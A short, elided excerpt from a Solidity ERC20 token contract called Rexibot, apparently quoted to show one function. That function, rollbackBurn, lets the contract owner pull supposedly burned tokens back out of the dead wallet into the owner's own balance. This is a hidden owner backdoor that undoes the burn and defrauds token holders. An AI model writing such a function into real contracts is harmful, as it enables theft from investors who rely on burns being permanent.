...
contract Rexibot is Context, IERC20, Ownable, ReentrancyGuard {
    ...
    uint256 private currentSupply = maxSupply;
    ...
    function rollbackBurn(uint256 _value) external onlyOwner {
        require(balances[deadWallet] >= _value, "BALANCE IS NOT ENOUGH");
        balances[msg.sender] = balances[msg.sender].add(_value);
        balances[deadWallet] = balances[deadWallet].sub(_value);
        emit Transfer(deadWallet, msg.sender, _value);
    }
}